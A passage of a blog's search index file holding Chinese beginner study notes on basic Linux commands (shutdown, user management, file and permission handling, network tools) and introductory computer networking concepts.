        <content type="html"><![CDATA[<h1 id="关机和重启"><a href="#关机和重启" class="headerlink" title="关机和重启"></a>关机和重启</h1><h2 id="1-shutdown"><a href="#1-shutdown" class="headerlink" title="1.shutdown"></a>1.shutdown</h2><p>[root@localhost ~]# shutdown[选项]<br>时间选项:<br>-c:取消前一个关机命令<br>-h:关机<br>-r:重启  </p><h2 id="其他关机命令"><a href="#其他关机命令" class="headerlink" title="其他关机命令"></a>其他关机命令</h2><p>halt<br>poweroff<br>init 0  </p><h2 id="其他重启命令"><a href="#其他重启命令" class="headerlink" title="其他重启命令"></a>其他重启命令</h2><p>reboot<br>init 6  </p><h1 id="系统运行级别"><a href="#系统运行级别" class="headerlink" title="系统运行级别"></a>系统运行级别</h1><p>0 关机<br>1 单用户(windows开机时 F8)<br>2  不完全用户，不含NFS(Network File Server)服务<br>3 完全多用户<br>4 未分配<br>5 图形界面<br>6 重启<br>cat /etc/inittab<br>修改系统的默认运行级别<br>id:3:initdefault:<br>runlevel<br>查看系统运行级别  </p><h1 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h1><p>退出登录    </p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用户管理命令</title>
      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h1><h2 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h2><p>命令所在路径:/usr/sbin/useradd<br>执行权限:root<br>语法: useradd username<br>功能描述:添加新用户<br>eg:$ useradd phantomor  </p><h3 id="useradd-命令无法使用"><a href="#useradd-命令无法使用" class="headerlink" title="useradd 命令无法使用"></a>useradd 命令无法使用</h3><p>useradd:无法锁定 /etc/passwd，请稍后再试  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/passwd <span class="comment">##查看权限；权限为读写</span></span><br><span class="line">lsattr /etc/passwd <span class="comment">##若出现i---e ,执行（1）；否则（2）</span></span><br><span class="line">chattr -i /etc/passwd <span class="comment">##(1)</span></span><br><span class="line">useradd zhangsan <span class="comment">##(1)</span></span><br><span class="line">sudo useradd zhangsan<span class="comment">##(2)；当然也可以直接执行这一步</span></span><br></pre></td></tr></table></figure><h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><p>命令所在路径:/usr/bin/passwd<br>执行权限:所有用户<br>语法: passwd 用户名<br>功能描述:设置用户密码  </p><h2 id="命令名称-who"><a href="#命令名称-who" class="headerlink" title="命令名称: who"></a>命令名称: who</h2><p>命令所在路径:/usr/bin/who<br>执行权限:所有用户<br>语法: who<br>功能描述:查看登录用户信息  </p><h2 id="命令名称-w"><a href="#命令名称-w" class="headerlink" title="命令名称:w"></a>命令名称:w</h2><p>命令所在路径:/usr/bin/w<br>执行权限:所有用户<br>语法: w<br>功能描述:查看登录用户详细信息  </p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件处理命令</title>
      <link href="/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>CTRL +C 终止命令 CTRL +L 清屏  </p><h1 id="1-命令格式和目录处理命令"><a href="#1-命令格式和目录处理命令" class="headerlink" title="1.命令格式和目录处理命令"></a>1.命令格式和目录处理命令</h1><p>命令 [-选项] [参数]<br>eg: ls -la /etc<br>当有多个选项时，可以写在一起<br>简化选项与完整选项 -a等于–all  </p><h2 id="命令名称-ls"><a href="#命令名称-ls" class="headerlink" title="命令名称:ls"></a>命令名称:ls</h2><p>命令英文原意: list<br>命令所在路径:/bin/ls<br>执行权限:所有用户<br>功能描述:显示目录文件<br>语法:ls选项[-ald][文件或目录]<br>-a显示所有文件，包括隐藏文件 all<br>-l详细信息显示 long<br>-lh 人性化显示 可以将字节转化为合适大小的单位<br>-i id号<br>-d查看目录属性<br><strong>eg:</strong><br>drwxr-xr-x 2(引用系数) root（所有者：只能有一个） root（所属组：多个） 4096（单位字节） 1月   9 02:18（修改时间如果没有被修改就为创建时间） 桌面（文件名）<br>既不是所有者又不是所属组就是其他人<br>文件类型<br>-表示为一个文件<br>d开头表示一个文件目录<br>l开头为一个软链接<br>rwx           r-x        r-x<br>u所有者g所属组 o其他人<br>r读w写x执行  </p><h2 id="命令名称-mkdir"><a href="#命令名称-mkdir" class="headerlink" title="命令名称: mkdir"></a>命令名称: mkdir</h2><p>命令英文原意: make directories<br>命令所在路径:/bin/mkdir<br>执行权限:所有用户<br>语法: mkdir -p [目录名]<br>功能描述:创建新目录<br>-p 递归创建  </p><h2 id="命令名称-cd"><a href="#命令名称-cd" class="headerlink" title="命令名称: cd"></a>命令名称: cd</h2><p>命令英文原意:change directory命令所在路径: shell内置命令执行权限:所有用户<br>语法: cd[目录]<br>功能描述:切换目录<br>. 表示当前目录 ..表示上一级目录  </p><h2 id="命令名称-pwd"><a href="#命令名称-pwd" class="headerlink" title="命令名称: pwd"></a>命令名称: pwd</h2><p>命令英文原意:print working directory<br>命令所在路径:/bin/pwd<br>执行权限:所有用户语法:pwd<br>功能描述:显示当前目录  </p><h2 id="命令名称-rmdir"><a href="#命令名称-rmdir" class="headerlink" title="命令名称: rmdir"></a>命令名称: rmdir</h2><p>命令英文原意:remove empty directories<br>命令所在路径:/bin/rmdir<br>执行权限:所有用户<br>语法: rmdir[目录名]<br>功能描述 <strong>:删除空目录</strong>  </p><h2 id="命令名称-cp"><a href="#命令名称-cp" class="headerlink" title="命令名称:cp"></a>命令名称:cp</h2><p>命令英文原意:copy<br>命令所在路径:/bin/ep<br>执行权限:所有用户<br>语法:cp -rp[原文件或目录][目标目录]<br>-r 复制目录<br>-p 保留文件属性<br>功能描述:复制文件或目录  </p><h2 id="命令名称-mv"><a href="#命令名称-mv" class="headerlink" title="命令名称: mv"></a>命令名称: mv</h2><p>命令英文原意:move<br>命令所在路径:/bin/mv<br>执行权限:所有用户<br>语法: mv[原文件或目录][目标目录]<br>功能描述:剪切文件、改名  </p><h2 id="命令名称-rm"><a href="#命令名称-rm" class="headerlink" title="命令名称:rm"></a>命令名称:rm</h2><p>命令英文原意:remove命令所在路径:/bin/rm执行权限:所有用户<br>语法: rm -rf[文件或目录]<br>-r删除目录<br>-f强制执行<br>功能描述:删除文件或目录  </p><h1 id="1-2文件处理命令"><a href="#1-2文件处理命令" class="headerlink" title="1.2文件处理命令"></a>1.2文件处理命令</h1><h2 id="命令名称-touch"><a href="#命令名称-touch" class="headerlink" title="命令名称: touch"></a>命令名称: touch</h2><p>命令所在路径:/bin/touch<br>执行权限:所有用户<br>语法: touch[文件名]<br>功能描述:创建空文件<br>如果想创建带空格的文件应将文件名写入“ ”中  </p><h2 id="命令名称-cat"><a href="#命令名称-cat" class="headerlink" title="命令名称: cat"></a>命令名称: cat</h2><p>命令所在路径:/bin/cat<br>执行权限:所有用户<br>语法: cat[文件名]<br>功能描述:显示文件内容<br>-n显示行号  </p><h2 id="命令名称-tac"><a href="#命令名称-tac" class="headerlink" title="命令名称: tac"></a>命令名称: tac</h2><p>命令所在路径:/usr/bin/tac<br>执行权限:所有用户<br>语法: tac[文件名]<br>功能描述:显示文件内容（反向列示)<br><strong>注意反向显示不支持-n</strong>  </p><h2 id="命令名称-more"><a href="#命令名称-more" class="headerlink" title="命令名称: more"></a>命令名称: more</h2><p>命令所在路径:/bin/more<br>执行权限:所有用户<br>语法: more[文件名]<br>(空格)或f   翻页<br>(Enter)  换行<br>b  返回<br>q或Q 退出<br>功能描述:分页显示文件内容  </p><h2 id="命令名称-less"><a href="#命令名称-less" class="headerlink" title="命令名称: less"></a>命令名称: less</h2><p>命令所在路径:/usr/bin/less<br>执行权限:所有用户<br>语法: less [文件名]<br>功能描述:分页显示文件内容（可向上翻页)<br>可以搜索关键词 n可以切换下一个  </p><h2 id="命令名称-head"><a href="#命令名称-head" class="headerlink" title="命令名称: head"></a>命令名称: head</h2><p>命令所在路径:/usr/bin/head执行权限:所有用户<br>语法: head[文件名]<br>功能描述:显示文件前面几行<br>-n指定行数 无指定默认前10行  </p><h2 id="命令名称-tail"><a href="#命令名称-tail" class="headerlink" title="命令名称: tail"></a>命令名称: tail</h2><p>命令所在路径:/usr/bin/tail<br>执行权限:所有用户<br>语法: tail[文件名]<br>功能描述:显示文件后面几行<br>-n指定行数<br>-f动态显示文件末尾内容  </p><h2 id="命令名称-ln"><a href="#命令名称-ln" class="headerlink" title="命令名称: ln"></a>命令名称: ln</h2><p>命令英文原意:link<br>命令所在路径:/bin/ln<br>执行权限:所有用户<br>语法: ln -s[原文件][目标文件]<br>-s创建软链接<br>功能描述:生成链接文件<br>软连接类似Windows的快捷方式<br><strong>软连接</strong> lrwxrwxrwx<br>新生成的文件 -&gt;源文件<br>箭头指向源文件<br><strong>硬链接</strong><br>1.属性一致 可与源文件同步更新 并且源文件删除无影响<br>2.通过i节点识别（硬链接id与源文件一致）<br>3.不能跨分区<br>4.不能针对目录使用  </p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限管理命令</title>
      <link href="/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="权限命令chmod"><a href="#权限命令chmod" class="headerlink" title="权限命令chmod"></a>权限命令chmod</h1><p>命令名称：chmod<br>英文：change the permissions mode of a file<br>命令所在路径：/bin/chmod<br>执行权限:所有用户<br>语法：chmod [{ugoa} {+-=} {rwx}][文件或目录]<br>            [mode=421][文件或目录]<br>            -R 递归修改 当操作目录时会将目录下的所有文件都改为一个修改值<br>功能描述：改变文件或目录权限<br>所有者u 所属组g 其他人o 所有人a<br>+增加权限 -减少权限 =修改权限<br>权限数字表示<br>r — 4<br>w — 2<br>x — 1<br>rwxrw-r– 764<br><img src="/.io//photo/linuxp/1.png" alt="Alt text" title="chmod权限修改"></p><p>当在777文件夹下存在一个644文件夹普通用户可以删除644文件夹  </p><p>文件<br>    r：cat/more/head/tail/less  查看内容<br>    w:vim 修改文件内容<br>    x:script command 可执行文件  </p><p>文件目录权限<br>| r                    | w                        | x            |<br>| ——————– | ———————— | ———— |<br>| 读权限               | 写权限                   | 执行权限     |<br>| 看文件内容           | 修改文件内容             | 执行文件内容 |<br>| 列出文件目录中的内容 | 创建删除文件或里面的目录 | 可以进入目录 |<br>| ls                   | touch/mkdir/rmidr/rm     | cd           |</p><p>更改权限：root和所属者  </p><h1 id="其他权限管理命令"><a href="#其他权限管理命令" class="headerlink" title="其他权限管理命令"></a>其他权限管理命令</h1><h2 id="权限管理命令：chown"><a href="#权限管理命令：chown" class="headerlink" title="权限管理命令：chown"></a>权限管理命令：chown</h2><p>命令英文原意: change file ownership<br>命令所在路径:/bin/chown<br>执行权限:所有用户<br>语法: chown[用户][文件或目录]<br>功能描述:改变文件或目录的所有者<br>useradd 添加用户  </p><h2 id="命令名称-chgrp"><a href="#命令名称-chgrp" class="headerlink" title="命令名称: chgrp"></a>命令名称: chgrp</h2><p>命令英文原意: change file group ownership<br>命令所在路径:/bin/chgrp<br>执行权限:所有用户<br>语法: chgrp[用户组][文件或目录]<br>功能描述:改变文件或目录的所属组<br>groupadd 添加组<br>缺省组就是默认组的意思  </p><h2 id="命令名称-umask"><a href="#命令名称-umask" class="headerlink" title="命令名称: umask"></a>命令名称: umask</h2><p>命令英文原意:the user file-creation mask<br>命令所在路径:Shell内置命令<br>执行权限:所有用户<br>语法: umask[-S]<br>-S以rwx形式显示新建文件缺省权限<br>功能描述:显示、设置文件的缺省权限<br>新创建的文件（touch）是没有可执行权限的（x）</p><p>umask 022<br>即为默认755<br>当mask的值是022—-w–w-<br>他的本来的权限与777是逻辑与的关系755目录，文件没有可执行权限即644</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络命令</title>
      <link href="/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h1><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>指令所在路径: /usr/bin/write<br>执行权限:所有用户<br>语法: write&lt;用户名&gt;<br>功能描述:给用户发信息，以Ctrl+D保存结束  </p><h2 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h2><p>命令英文原意:write all<br>指令所在路径:/usr/bin/wall<br>执行权限:所有用户<br>语法: wall [message]<br>功能描述:发广播信息  </p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>命令所在路径:/bin/ping<br>执行权限:所有用户<br>语法: ping选项IP地址<br>-c指定发送次数<br>功能描述:测试网络连通性   </p><h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p>命令英文原意: interface configure<br>命令所在路径:/sbin/ifconfig<br>执行权限: root<br>语法: ifconfig网卡名称IP地址<br>功能描述:查看和设置网卡信息  </p><h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><p>命令所在路径:/bin/mail<br>执行权限:所有用户语法: mail [用户名]<br>功能描述:查看发送电子邮件  </p><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><p>命令所在路径:/usr/bin/last<br>执行权限:所有用户<br>语法: last<br>功能描述:列出目前与过去登入系统的用户信息  </p><h2 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h2><p>命令所在路径:/usr/bin/lastlog<br>执行权限:所有用户<br>语法: lastlog<br>功能描述:检查某特定用户上次登录的时间<br>-u 加id只查看该用户   </p><h2 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h2><p>命令所在路径:/bin/traceroute<br>执行权限:所有用户<br>语法: traceroute<br>功能描述:显示数据包到主机间的路径<br>traceroute <a href="http://www.baidu.com/">www.baidu.com</a>  </p><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>命令所在路径:/bin/netstat<br>执行权限:所有用户<br>语法: netstat[选项]<br>功能描述:显示网络相关信息<br>-t tcp协议<br>-u UDP协议<br>-l 监听<br>-r 路由<br>-n 显示ip地址和端口号<br>服务发起端口是随机的，只有接收端口是固定的<br>netstat -tlun<br>查看本机监听的端口<br>netstat -an<br>查看本机所有的网络连接<br>#netstat -rn<br>查看本机路由表  </p><h2 id="setup-redhat"><a href="#setup-redhat" class="headerlink" title="setup (redhat)"></a>setup (redhat)</h2><p>命令所在路径:/usr/bin/setup<br>执行权限:root<br>语法: setup<br>功能描述:配置网络  </p><h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p>命令位置:/bin/mount<br>执行权限:所有用户<br>命令语法: mount [-t文件系统]设备文件名挂载点<br>范例:# mount -t iso9660 /dev/sr0 /mnt/cdrom  </p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网初次学习</title>
      <link href="/2021/03/23/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E5%AE%9A%E4%B9%89/"/>
      <url>/2021/03/23/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E5%AE%9A%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<h1 id="计网定义"><a href="#计网定义" class="headerlink" title="计网定义"></a>计网定义</h1><p>连通性和共享  </p><h2 id="计网分类"><a href="#计网分类" class="headerlink" title="计网分类"></a>计网分类</h2><h3 id="1-计网范围"><a href="#1-计网范围" class="headerlink" title="1.计网范围"></a>1.计网范围</h3><p>广域网WAN<br>城域网MAN<br>局域网LAN  </p><h3 id="2-使用者分类"><a href="#2-使用者分类" class="headerlink" title="2.使用者分类"></a>2.使用者分类</h3><p>公用网和专用网</p><h3 id="3-接入网"><a href="#3-接入网" class="headerlink" title="3.接入网"></a>3.接入网</h3><p>AN  </p><h2 id="计网性能"><a href="#计网性能" class="headerlink" title="计网性能"></a>计网性能</h2><p>1.速率 bit/s 实际值<br>2.带宽 bandwidth 频带宽度 最高速度<br>3.吞吐量 单位时间内通过的网络 吞吐量受带宽的限制<br>4.时延 delay<br>发送时延 传播时延 处理时延 排队时延<br>5.时延带宽积<br>6.往返时间 RTT<br>7.利用率  D=D0/1-U  </p><h2 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h2><p>协议<br>为网络中数据的交换而建立的规则</p><p><strong>各层级功能</strong>  </p><ol><li>差错控制    </li><li>流量控制    </li><li>分段和重装  </li><li>复用和分用</li><li>连接的建立与释放    </li></ol><p>五层协议体系结构</p><ul><li>应用层 application layer</li><li>运输层 transport layer</li><li>网络层 network layer</li><li>数据链路层 data link layer</li><li>物理层 physical layer</li></ul><p>协议是水平的 服务是垂直的</p>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网学习-应用层</title>
      <link href="/2021/03/23/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2021/03/23/%E8%AE%A1%E7%BD%91/%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>在Web应用程序中，有两个互相通信的不同的程序：一个是运行在用户主机上的浏览器程序；另一个是运行在Web服务器主机上的Web服务器程序</p>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网学习-物理层</title>
      <link href="/2021/03/23/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/"/>
      <url>/2021/03/23/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>机械特性：接口所用的形状和尺寸<br>电气特性：接口电缆各个显示出现的电压范围<br>功能特性：电压代表的含义<br>过程特性：出现事件的顺序   </p><h1 id="数据通信"><a href="#数据通信" class="headerlink" title="数据通信"></a>数据通信</h1><p>通信系统的三大部分：源系统(发送端)、传输系统(传输网络)，目的系统(接收端，接收方)。<br>数据（data）——运送信息的实体<br>信号（signal）——数据的电气的或电磁的表现<br>模拟信号(analogous signal)——代表消息的参数是连续的<br>数字信号(digital signal)——代表消息的参数的取值是类散的<br>信道<br>码元（code）-使用时间域的波形表示数字信号，代表不同的波形。<br>单向通信：只能有一个方向的同学而不能有反方向的交互。<br>双向交替通信<br>双向同时通信    </p><p>基带信号是(基本频带信号)最原始的1和0<br>基带信号中往往包含低频或直流部分，许多信道不能传输这种，因此必须对基带信号进行调制（modulation）</p><p>调制分为基带调制和带通调制<br>基带调制:仅对基带信号的波形进行变换,使它能够与信道特性相适应。变换后的信号仍然是基带信号。把这种过程称为编码(coding)。<br>带通调制:使用载波(carrier)进行调制，把基带信号的频率范围搬移到较高的频段，并转换为模拟信号，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道)。<br><strong>带通信号</strong> :经过载波调制后的信号。  </p><h2 id="基带调制"><a href="#基带调制" class="headerlink" title="基带调制"></a>基带调制</h2><p>编码方式<br>比特流：<br>不归零制<br>归零制<br>曼切斯特<br>差分曼切斯特</p><h2 id="带通调制"><a href="#带通调制" class="headerlink" title="带通调制"></a>带通调制</h2><p>调幅AM 调频FM 调相PM   </p><h1 id="传输媒体"><a href="#传输媒体" class="headerlink" title="传输媒体"></a>传输媒体</h1><p>双绞线 CAT<br>同轴电缆（不太使用了）<br>光纤<br>多模光纤：可反射多个光<br>单模光纤：不太损耗能量   </p><h1 id="信号复用"><a href="#信号复用" class="headerlink" title="信号复用"></a>信号复用</h1><h1 id="数据传输"><a href="#数据传输" class="headerlink" title="*数据传输"></a>*数据传输</h1><h1 id="宽带接入技术"><a href="#宽带接入技术" class="headerlink" title="*宽带接入技术"></a>*宽带接入技术</h1>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
